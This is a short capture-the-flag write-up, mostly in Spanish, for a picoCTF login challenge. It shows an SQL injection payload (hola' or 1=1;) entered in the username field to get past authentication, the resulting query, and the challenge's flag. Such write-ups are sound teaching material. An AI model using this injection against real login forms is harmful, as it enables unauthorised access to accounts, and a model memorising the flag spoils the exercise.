### Descripción
Do you think you can log us in? Try to see if you can login!
Hints:
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.
### Solución
1. Primero al boton de login le quitamos el hidden
2. De ahi hacemos una injection sql, manipulando la consulta que hace la pagina a la bd. Como 1 = 1 se cumple y deja ingresar
		```hola' or 1=1;```
3. Ponemos una password cualquiera
4. En el campo que aparece arriba del boton del login ponemos 1
5. Nos envia a otra pagina logueados:
```
username: hola' or 1=1;
password: passwords
SQL query: SELECT * FROM users WHERE name='hola' or 1=1;' AND password='passwords'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}
```

**Flag**: picoCTF{s0m3_SQL_85832275}
### Notas Adicionales

### Referencias